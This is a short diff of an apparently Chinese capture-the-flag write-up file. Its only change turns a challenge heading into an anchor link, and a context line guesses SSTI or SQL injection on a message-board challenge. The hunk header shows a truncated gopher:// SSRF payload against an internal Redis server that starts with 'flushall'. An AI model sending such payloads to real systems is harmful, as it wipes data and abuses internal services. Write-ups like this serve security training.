@@ -1926,7 +1926,7 @@ gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D
 
 
 
-## [网鼎杯 2018]Comment
+## [[网鼎杯 2018]Comment](#Comment)
 
 打开题目为留言板，猜测SSTI，sql注入之类的。
 
